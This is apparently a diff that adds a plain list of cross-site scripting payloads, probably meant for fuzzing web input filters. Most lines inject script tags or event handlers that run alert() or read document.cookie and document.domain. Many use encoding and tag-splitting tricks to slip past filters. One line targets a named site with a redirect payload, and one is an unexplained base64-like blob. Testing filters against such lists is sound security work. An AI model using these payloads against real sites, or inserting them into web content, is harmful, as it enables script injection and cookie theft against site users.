@@ -1,0 +1,38 @@
+<script>alert(123);</script>
+test\"]);}}}();</script><script>alert(1)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+xxx\"<script>alert(1)</script>
+preview.cashsweep.com/content.asp?page=>'><script>window.location = "http://www.google.com/"</script>
+<scr\ipt>alert(123);</scr\ipt>
+&lt;script&gt;alert(123);&lt;/script&gt;
+%3CSCRIPT%3Ealert('XSS')%3C%2FSCRIPT%3E
+%26apos%3b%26%2341%3b%3balert(1)%2f%2f13
+'%3balert(1)%2f%2f
+%58%53%53%3c%44%49%56%20%4f%4e%43%4c%49%43%4b%3d%22%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%22%3e%54%65%73%74%0d%3c%2f%44%49%56%3e%62%75%74%74%6f%6e
+
+
+<SCR&#x0A;IPT>alert('XSS')</SCR&#x0A;IPT>
+<IMG SRC="#" ONERROR="alert('XSS')"/>
+<INPUT TYPE="BUTTON" ONCLICK="alert('XSS')"/>
+<INPUT TYPE="BUTTON" ONCL%49CK="alert('XSS')"/>
+
+<IFRAME SRC="javascr%49pt:alert(document.domain);"></IFRAME>
+<SCR&#x0A;IPT>alert('XSS')</SCR&#x0A;IPT>
+%3CSCR&#x0A;IPT%3Ealert('XSS')%3C%2FSCR&#x0A;IPT%3E
+<div%20onfocus="alert(document.cookie)">test</div>
+INNER_TEXT=XSS%3Cdivonclick%3D+alert%28document.cookie%29+%3ETest%3C%2Fdiv%3Ebutton
+<div oncl%49ck="alert(document.cookie)">test</div>
+ XNmUmBRgBIRtOKYRR9OCrX/htXo51HlEmYEBee8Un/BxXzFbJYPTChIDXo3H0TKESfPCmf8/KXsU59LHKZDqEa+VpMygaq3mBSf4bHh/KYuG2Pu9ZGWmqY2p0y9SoHgamq/2bOPGk79jwe4v8mRb+Q==
+ <a href="javascr%49pt%3Aalert('Hello World!');">Execute%3AJavaScript</a>
+ <scr%49pt>alert(123);</scr%49pt>
+ <IMG SRC="javascr%49pt%3Aalert('Hello World!');" ONERROR="alert('XSS')"/>
+ <IMG SRC="javascr%49pt%3Aalert('Hello World!');" onchange ="alert('XSS')"/>
+<form action="alert(123);">  First name:<br>  <input type="text"name="firstname" value="Mickey">  <br>  Last name:<br>  <inputtype="text" name="lastname" value="Mouse">   <br><br>  <input type="submit" value="Submit"></form> 
+<a href="mailto%3asomeone@example.com?cc=someoneelse@example.com&bcc=andsomeoneelse@example.com&subject=Summer%20Party&body=You%20are%20invited%20to%20a%20big%20summer%20party!" target="_top">Send mail!</a>
+ 
+ &lt;IMG+SRC='javascr%49pt%3Aalert(document.domain);'+ONERROR='alert(document.domain)'/&gt;
+<INPUT TYPE="BUTTON" ONCLICK="alert(document.domain)"/>
+ &lt;script&gt;alert(document.domain);&lt;/script&gt;
+ <script>alert(document.domain);</script>
+&lt;script&gt;alert(document.domain);&lt;/script&gt;
+%3CSCRIPT%3Ealert(document.domain)%3C%2FSCRIPT%3E
